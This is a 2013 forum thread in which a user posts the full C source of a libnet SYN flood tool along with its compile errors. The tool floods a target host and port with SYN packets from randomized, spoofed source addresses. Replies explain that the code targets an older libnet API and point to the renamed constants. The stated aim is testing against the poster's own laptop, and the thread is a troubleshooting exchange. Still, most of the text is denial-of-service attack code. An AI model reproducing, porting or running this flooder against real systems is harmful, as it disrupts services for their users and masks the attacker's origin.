---
title: "Libnet Compilation Trouble"
date: 2013-02-04
forum: Programming Talk
---

### Post by dansofe0r on 2013-02-04
Hello everyone. I am trying to compile a program and receive the following output. It is a program that I'm using to try to make a SYN flood on a laptop I have from another computer in the house. :

```

$ gcc $(libnet-config --defines) -o synflood synflood.c -lnet
synflood.c: In function ‘main’:
synflood.c:15:46: error: ‘LIBNET_IP_H’ undeclared (first use in this function)
synflood.c:15:46: note: each undeclared identifier is reported only once for each function it appears in
synflood.c:28:16: error: ‘LIBNET_ERR_FATAL’ undeclared (first use in this function)
synflood.c:33:2: error: too few arguments to function ‘libnet_seed_prand’
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:156:1: note: declared here
synflood.c:59:4: warning: passing argument 8 of ‘libnet_build_tcp’ makes integer from pointer without a cast [enabled by default]
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:602:1: note: expected ‘u_int16_t’ but argument is of type ‘void *’
synflood.c:59:4: error: too few arguments to function ‘libnet_build_tcp’
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:602:1: note: declared here
synflood.c:60:3: warning: passing argument 1 of ‘libnet_do_checksum’ from incompatible pointer type [enabled by default]
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:2135:1: note: expected ‘struct libnet_t *’ but argument is of type ‘u_char *’
synflood.c:60:3: warning: passing argument 2 of ‘libnet_do_checksum’ makes pointer from integer without a cast [enabled by default]
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:2135:1: note: expected ‘u_int8_t *’ but argument is of type ‘int’
synflood.c:60:3: error: too few arguments to function ‘libnet_do_checksum’
In file included from /usr/include/libnet.h:125:0,
                 from synflood.c:1:
/usr/include/./libnet/libnet-functions.h:2135:1: note: declared here
synflood.c:65:17: error: ‘LIBNET_ERR_WARNING’ undeclared (first use in this function)


```

I think that I am missing an include statement in the code. If not then maybe I am missing something from libnet. 

Here is the code I am trying to compile as well. Thank you. 

```

#include <libnet.h>

#define FLOOD_DELAY 5000    // Delay between packet injects by 5000ms

/* Returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr){
    return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]){
    u_long dest_ip;
    u_short dest_port;
    u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
    int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

    if(argc < 3)
    {
        printf("Usage:\n%s\t <target host> <target port> \n", argv[0]);
        exit(1);
    }

    dest_ip = libnet_open_resolve(argv [1], LIBNET_RESOLVE);    // The host
    dest_port = (u_short) atoi(argv[2]);    // The port

    network = libnet_open_raw_sock(IPPROTO_RAW);    // Open network interface
    if (network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface.    -- this program must run as root.\n");
    libnet_init_packet(packet_size, &packet);    // Allocate memory for packet
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");
    
    libnet_seed_prand();    // Seed the random number generator

    printf("SYN Flooding port %d of %s...\n", dest_port, print_ip(&dest_ip));
    while(1)    // loop forever (until break by CTRL-C)
    {
        libnet_build_ip(LIBNET_TCP_H,            // Size of the packet sans IP header
            IPTOS_LOWDELAY,                // IP tos
            libnet_get_prand(LIBNET_PRu16),        // IP ID (randomized)
            0,                    // Frag stuff
            libnet_get_prand(LIBNET_PR8),        // TTL (randomized)
            IPPROTO_TCP,                // Transport protocol
            libnet_get_prand(LIBNET_PRu32),        // Source IP (randomized)
            dest_ip,                // Destination IP
            NULL,                    // Payload (none)
            0,                    // Payload length
            packet);                // Packet header memory
        
        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16),    // Source Tcp port (random)
            dest_port,            // Destination TCP port
            libnet_get_prand(LIBNET_PRu32),    // Sequence number (randomized)
            libnet_get_prand(LIBNET_PRu32),    // Acknowledgement number (randomized)
            TH_SYN,                // Control flags (SYN flag set only)
            libnet_get_prand(LIBNET_PRu16),    // Window size (randomized)
            0,                // Urgent pointer
            NULL,                // Payload (none)
            0,                // Payload length
            packet + LIBNET_IP_H);        // Packet header memory
        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

        byte_count = libnet_write_ip(network, packet, packet_size);    // Inject packet
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d bytes)", byte_count, packet_size);

        usleep(FLOOD_DELAY);    // Wait for FLOOD_DELAY milliseconds. 
    }

    libnet_destroy_packet(&packet);    // Free packet memory

    if (libnet_close_raw_sock(network) == -1)    // Close the network interface
        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

    return 0;
}

```

---

### Post by Bachstelze on 2013-02-04
What is the output of *libnet-config --defines*?

---

### Post by dansofe0r on 2013-02-04
```

~$ libnet-config --defines
-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H


```

Am I missing some defines?

---

### Post by spjackson on 2013-02-05
It looks like the source you are trying to compile was written for an earlier version of libnet. [http://stackoverflow.com/questions/3789014/error-libnet-err-fatal-with-libnet]("http://stackoverflow.com/questions/3789014/error-libnet-err-fatal-with-libnet")

LIBNET_IP_H seems to have been dropped and LIBNET_IPV4_H and LIBNET_IPV6_H have been added. etc.

---

